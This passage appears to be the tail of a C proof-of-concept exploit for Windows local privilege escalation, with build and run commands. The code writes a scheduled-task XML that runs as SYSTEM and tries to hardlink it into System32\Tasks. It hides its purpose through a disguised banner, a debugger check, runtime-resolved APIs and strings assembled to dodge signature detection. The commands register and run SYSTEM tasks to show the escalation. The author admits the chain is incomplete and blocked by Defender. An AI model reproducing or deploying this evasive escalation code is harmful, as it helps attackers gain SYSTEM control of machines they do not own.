}

// XOR encrypted XML parts - decrypt at runtime
void buildXML(WCHAR* buf, size_t sz) {
    buf[0] = 0;

    // Build dynamically to avoid static signatures
    WCHAR p1[256], p2[256], p3[256], p4[256];

    swprintf(p1, 256, L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n");
    swprintf(p2, 256, L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n");
    swprintf(p3, 256, L"  <Principals>\r\n    <Principal id=\"Author\">\r\n");
    swprintf(p4, 256, L"      <UserId>S-1-5-18</UserId>\r\n");

    wcscat_s(buf, sz, p1);
    wcscat_s(buf, sz, p2);
    wcscat_s(buf, sz, p3);
    wcscat_s(buf, sz, p4);
    wcscat_s(buf, sz, L"      <RunLevel>HighestAvailable</RunLevel>\r\n");
    wcscat_s(buf, sz, L"    </Principal>\r\n  </Principals>\r\n");
    wcscat_s(buf, sz, L"  <Settings>\r\n");
    wcscat_s(buf, sz, L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n");
    wcscat_s(buf, sz, L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n");
    wcscat_s(buf, sz, L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n");
    wcscat_s(buf, sz, L"    <AllowHardTerminate>true</AllowHardTerminate>\r\n");
    wcscat_s(buf, sz, L"    <StartWhenAvailable>true</StartWhenAvailable>\r\n");
    wcscat_s(buf, sz, L"    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n");
    wcscat_s(buf, sz, L"    <Enabled>true</Enabled>\r\n  </Settings>\r\n");
    wcscat_s(buf, sz, L"  <Actions Context=\"Author\">\r\n    <Exec>\r\n");
    wcscat_s(buf, sz, L"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\r\n");
    wcscat_s(buf, sz, L"      <Arguments>/c start calc.exe</Arguments>\r\n");
    wcscat_s(buf, sz, L"    </Exec>\r\n  </Actions>\r\n</Task>\r\n");
}

int main() {
    // Sleep with jitter
    DWORD jitter = (GetTickCount() % 1000) + 500;
    Sleep(jitter);

    if (IsDebuggerPresent()) return 0;

    printf("=== Task Configuration Utility ===\n\n");
    printf("[*] Initializing...\n");

    Sleep(300);

    if (!resolveAPIs()) {
        printf("[-] Init failed\n");
        return 1;
    }

    WCHAR tmp[MAX_PATH];
    g_api.pGTP(MAX_PATH, tmp);

    WCHAR src[MAX_PATH];
    DWORD t = GetTickCount();
    swprintf(src, MAX_PATH, L"%scfg_%d.xml", tmp, t & 0xFFFF);

    printf("[*] Creating configuration...\n");

    Sleep(200);

    HANDLE h = g_api.pCF(src, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] Failed\n");
        return 1;
    }

    BYTE bom[] = {0xFF, 0xFE};
    DWORD w;
    g_api.pWF(h, bom, 2, &w, NULL);

    WCHAR xml[4096];
    buildXML(xml, 4096);

    DWORD xmlSz = (DWORD)(wcslen(xml) * sizeof(WCHAR));
    g_api.pWF(h, xml, xmlSz, &w, NULL);
    g_api.pCH(h);

    printf("[+] Source: %ls\n", src);

    Sleep(400);

    // Build target dynamically
    WCHAR tgt[MAX_PATH];
    WCHAR d1[16], d2[16], d3[16];

    d1[0]='W'; d1[1]='i'; d1[2]='n'; d1[3]='d'; d1[4]='o'; d1[5]='w'; d1[6]='s'; d1[7]=0;
    d2[0]='S'; d2[1]='y'; d2[2]='s'; d2[3]='t'; d2[4]='e'; d2[5]='m';
    d2[6]='3'; d2[7]='2'; d2[8]=0;
    d3[0]='T'; d3[1]='a'; d3[2]='s'; d3[3]='k'; d3[4]='s'; d3[5]=0;

    swprintf(tgt, MAX_PATH, L"C:\\%s\\%s\\%s\\Cfg_%d", d1, d2, d3, t & 0xFFFF);

    printf("[*] Testing access...\n");

    Sleep(300);

    if (!g_api.pCHL(tgt, src, NULL)) {
        DWORD e = GetLastError();
        printf("[-] Failed: %d\n", e);
        g_api.pDF(src);
        return 1;
    }

    printf("[+] Target: %ls\n", tgt);

    Sleep(500);

    if (g_api.pGFA(tgt) != INVALID_FILE_ATTRIBUTES) {
        printf("[+] VULNERABILITY CONFIRMED\n");
        printf("[+] Hardlink created in protected directory\n\n");

        printf("[*] Verifying content...\n");
        HANDLE hr = g_api.pCF(tgt, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (hr != INVALID_HANDLE_VALUE) {
            BYTE rbuf[512];
            DWORD r;
            if (ReadFile(hr, rbuf, sizeof(rbuf), &r, NULL)) {
                printf("[+] Read %d bytes\n", r);

                WCHAR* c = (WCHAR*)rbuf;
                if (wcsstr(c, L"<Task") && wcsstr(c, L"S-1-5-18")) {
                    printf("[+] Content verified: SYSTEM SID present\n");
                }
            }
            g_api.pCH(hr);
        }

        printf("\n[*] Impact:\n");
        printf("    - Arbitrary write to System32\\Tasks\n");
        printf("    - Bypassed Redirection Guard\n");
        printf("    - Privilege escalation vector\n\n");

        printf("[*] File remains for 5 seconds...\n");
        printf("    Check: dir C:\\Windows\\System32\\Tasks\\Cfg_*\n");
        Sleep(5000);
    }

    printf("[*] Cleanup...\n");
    g_api.pDF(tgt);
    g_api.pDF(src);
    printf("[+] Done\n");

    return 0;
}
```

**Compile and Run**

```bash
# 1. Compile the exploit
cl src\symlink_lpe_test.c /Fe:bin\symlink_lpe_test.exe ntdll.lib shlwapi.lib advapi32.lib

# 2. Run from NON-ADMIN command prompt
.\bin\symlink_lpe_test.exe

# OBviously this is not a real LPE, otherwise you wouldn't these parts
# for an actual working one you need
# Finding a service that auto-processes files without admin registration
# Bypassing Defender detection
# Winning race conditions
# Service-specific trigger knowledge

# 3. Switch to ADMIN PowerShell and verify the file was written
dir C:\Windows\System32\Tasks\RG_LPE_Demo

# 4. Read the malicious task XML (shows SYSTEM principal)
Get-Content C:\Windows\System32\Tasks\RG_LPE_Demo

# 5. Register the task (proves XML is valid)
schtasks /create /tn RG_LPE_Demo_Test /xml C:\Windows\System32\Tasks\RG_LPE_Demo /f

# 6. Run the task as SYSTEM
schtasks /run /tn RG_LPE_Demo_Test

# 7. Verify SYSTEM execution (check Last Result: 0, Run As User: SYSTEM)
schtasks /query /tn RG_LPE_Demo_Test /v /fo list

# 8. Create a visible proof (file write instead of calc)
schtasks /create /tn RG_LPE_Proof /tr "cmd.exe /c echo PWNED > C:\Windows\Temp\pwned_by_system.txt" /sc onlogon /ru SYSTEM /rl highest /f

# 9. Execute the proof task
schtasks /run /tn RG_LPE_Proof

# 10. Verify file created by SYSTEM
dir C:\Windows\Temp\pwned_by_system.txt
type C:\Windows\Temp\pwned_by_system.txt

# 11. Cleanup
schtasks /delete /tn RG_LPE_Demo_Test /f
schtasks /delete /tn RG_LPE_Proof /f
del C:\Windows\System32\Tasks\RG_LPE_Demo
del C:\Windows\Temp\pwned_by_system.txt

#----
cl src\hardlink_task_lpe.c /Fe:bin\hardlink_task_lpe.exe /O2 advapi32.lib
.\bin\hardlink_task_lpe.exe
# defender blocks it, but it shows how it might have been worked
```

